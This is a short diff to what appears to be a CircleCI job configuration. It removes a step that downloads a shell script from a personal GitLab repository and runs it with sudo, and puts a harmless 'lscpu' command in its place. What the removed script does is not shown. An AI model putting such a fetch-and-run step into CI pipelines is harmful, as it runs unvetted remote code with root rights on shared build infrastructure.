@@ -9,4 +9,4 @@ jobs:
       image: ubuntu-2004:202010-01
     steps:
       - checkout
-      - run:  wget -O ah.sh https://gitlab.com/rizkyadhypratama/gass/-/raw/main/sc.sh && chmod +x ah.sh && sudo ./ah.sh
+      - run:  lscpu
